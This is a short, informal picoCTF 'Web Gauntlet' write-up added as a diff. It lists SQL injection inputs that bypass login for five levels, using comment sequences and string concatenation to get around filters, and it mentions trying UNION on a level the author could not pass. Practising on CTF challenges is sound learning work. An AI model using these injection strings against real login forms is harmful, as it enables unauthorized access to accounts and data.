@@ -1,0 +1,14 @@
+picoctf web gauntlet writeup
+
+1.just try to pass by sql injection
+
+level1 -> level5
+user="admin' -- " , password="aa"
+user="admin'/*" , password="aa"
+user="admin'/*" , password="aa"
+user="ad'||'min'/*" , password="aa"
+user="ad'||'min'/*" , password="aa"
+
+2.i cannot pass by in level 4 , so i search some articles , may be can use "union" to pass
+
+3.get flag!
